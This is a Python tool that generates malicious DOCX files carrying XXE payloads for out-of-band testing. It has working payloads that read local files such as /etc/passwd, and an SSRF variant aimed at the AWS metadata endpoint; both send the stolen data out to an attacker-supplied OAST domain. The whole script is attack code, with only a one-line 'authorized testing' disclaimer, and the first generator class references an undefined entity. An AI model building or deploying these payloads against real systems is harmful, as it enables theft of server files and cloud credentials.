import zipfile

class DOCX_XXE_Generator:
    def __init__(self):
        self.template_files = {}
    
    def create_xxe_docx(self, target_url, output_filename):
        if not output_filename.endswith('.docx'):
            output_filename += '.docx'
        
        docx_structure = {
            '[Content_Types].xml': self.get_content_types_xml(),
            '_rels/.rels': self.get_rels_xml(),
            'word/document.xml': self.get_document_xml(target_url),
            'word/settings.xml': self.get_settings_xml(target_url),
            'word/_rels/document.xml.rels': self.get_document_rels_xml()
        }
        
        with zipfile.ZipFile(output_filename, 'w') as docx:
            for file_path, content in docx_structure.items():
                docx.writestr(file_path, content)
        
        print(f"[+] OAST XXE DOCX created: {output_filename}")
        print(f"[+] OAST Target: {target_url}")
    
    def get_document_xml(self, oast_url):
        return f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://{oast_url}/evil.dtd">
%dtd;
]>
<data>&send;</data>"""
    
    def get_settings_xml(self, oast_url):
        return f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE settings [
<!ENTITY % remote SYSTEM "http://{oast_url}/payload.dtd">
%remote;
]>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:proofState w:grammar="clean" w:spelling="clean"/>
</w:settings>"""

    def get_content_types_xml(self):
        return '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
<Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
</Types>'''
    
    def get_rels_xml(self):
        return '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''

    def get_document_rels_xml(self):
        return '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>'''

class Advanced_XXE_Generator:
    def create_oast_docx(self, oast_domain, output_filename, payload_type="standard", file_path=None, ssrf_url=None):
        if not output_filename.endswith('.docx'):
            output_filename += '.docx'
        
        if payload_type == "standard":
            content = self.get_standard_oast_payload(oast_domain)
        elif payload_type == "file_read":
            target_file = file_path if file_path else "/etc/passwd"
            content = self.get_file_read_oast_payload(oast_domain, target_file)
        elif payload_type == "ssrf":
            target_url = ssrf_url if ssrf_url else "http://169.254.169.254/latest/meta-data/"
            content = self.get_ssrf_oast_payload(oast_domain, target_url)
        else:
            content = self.get_standard_oast_payload(oast_domain)
        
        docx_structure = {
            '[Content_Types].xml': self.get_content_types_xml(),
            '_rels/.rels': self.get_rels_xml(),
            'word/document.xml': content,
            'word/settings.xml': self.get_settings_xml(oast_domain)
        }
        
        with zipfile.ZipFile(output_filename, 'w') as docx:
            for file_path, content in docx_structure.items():
                docx.writestr(file_path, content)
        
        print(f"[+] {payload_type} OAST DOCX created: {output_filename}")
        print(f"[+] OAST Domain: {oast_domain}")
    
    def get_standard_oast_payload(self, oast_domain):
        return f"""<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % dtd SYSTEM "http://{oast_domain}/trigger">
%dtd;
]>
<data>Test</data>"""
    
    def get_file_read_oast_payload(self, oast_domain, file_path):
        return f"""<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file://{file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{oast_domain}/exfil?data=%file;'>">
%eval;
%exfil;
]>
<data>File Read Test</data>"""
    
    def get_ssrf_oast_payload(self, oast_domain, target_url):
        return f"""<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % payload SYSTEM "{target_url}">
<!ENTITY % oob "<!ENTITY &#x25; send SYSTEM 'http://{oast_domain}/ssrf?data=%payload;'>">
%oob;
%send;
]>
<data>SSRF Test</data>"""
    
    def get_content_types_xml(self):
        return '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''
    
    def get_rels_xml(self):
        return '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''
    
    def get_settings_xml(self, oast_domain):
        return f"""<?xml version="1.0"?>
<!DOCTYPE settings [
<!ENTITY % remote SYSTEM "http://{oast_domain}/settings">
%remote;
]>
<settings/>"""

def main():
    print("OAST XXE DOCX Generator")
    print("=" * 50)
    
    oast_url = input("OAST Domain (e.g., 1hjjugqm7mapf3fvsx2sj1nublhc54tt.oastify.com): ").strip()
    output_filename = input("Output filename: ").strip()
    
    if not output_filename:
        output_filename = "oast_payload.docx"
    
    if not oast_url:
        print("[-] OAST domain is required!")
        return
    
    print("\nPayload Types:")
    print("1 - Standard OAST")
    print("2 - File Read + OAST") 
    print("3 - SSRF + OAST")
    
    choice = input("Selection (1-3): ").strip()
    
    generator = Advanced_XXE_Generator()
    
    file_path = None
    ssrf_url = None
    
    if choice == "2":
        file_path = input("Target file path (default: /etc/passwd): ").strip()
        if not file_path:
            file_path = "/etc/passwd"
    elif choice == "3":
        ssrf_url = input("SSRF target URL (default: AWS metadata): ").strip()
        if not ssrf_url:
            ssrf_url = "http://169.254.169.254/latest/meta-data/"
    
    try:
        if choice == "1":
            generator.create_oast_docx(oast_url, output_filename, "standard")
        elif choice == "2":
            generator.create_oast_docx(oast_url, output_filename, "file_read", file_path)
        elif choice == "3":
            generator.create_oast_docx(oast_url, output_filename, "ssrf", ssrf_url=ssrf_url)
        else:
            generator.create_oast_docx(oast_url, output_filename, "standard")
        
        print(f"\n[+] Listening for OAST requests: {oast_url}")
        print("[!] This file should only be used in authorized testing environments!")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
